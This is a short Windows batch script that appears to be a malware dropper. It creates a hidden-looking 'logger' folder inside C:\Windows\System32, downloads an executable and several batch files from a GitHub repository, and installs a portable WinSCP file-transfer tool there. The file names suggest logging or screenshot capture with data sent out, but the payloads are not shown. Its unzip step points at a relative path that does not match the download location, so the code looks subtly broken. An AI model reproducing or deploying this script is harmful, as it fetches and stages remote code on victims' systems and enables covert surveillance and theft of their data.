@echo off
mkdir C:\Windows\System32\logger
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/accgen.exe -OutFile C:\Windows\System32\logger\accgen.exe
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/define.bat -OutFile C:\Windows\System32\logger\define.bat
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss.bat -OutFile C:\Windows\System32\logger\ss.bat
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss1.bat -OutFile C:\Windows\System32\logger\ss1.bat
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/gen.bat -OutFile C:\Windows\System32\logger\gen.bat
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/WinSCP-5.21.2-Portable.zip -OutFile C:\Windows\System32\logger\scp.zip
powershell Expand-Archive scp.zip -DestinationPath C:\Windows\System32\logger\
del /Q C:\Windows\System32\logger\license.txt
del /Q C:\Windows\System32\logger\readme.txt
del /Q C:\Windows\System32\logger\scp.zip
